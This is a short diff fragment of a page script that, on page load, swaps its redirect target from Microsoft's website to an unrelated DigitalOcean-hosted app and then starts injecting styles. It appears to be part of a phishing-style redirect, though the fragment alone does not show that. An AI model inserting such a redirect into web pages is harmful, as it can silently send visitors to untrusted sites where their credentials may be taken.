@@ -16,7 +16,7 @@
 <script>
         document.addEventListener("DOMContentLoaded", function () {
 
-            const redirectUrl = "https://microsoft.com";
+            const redirectUrl = "https://lobster-app-cvmtg.ondigitalocean.app";
 
             const style = document.createElement("style");
             style.textContent = `
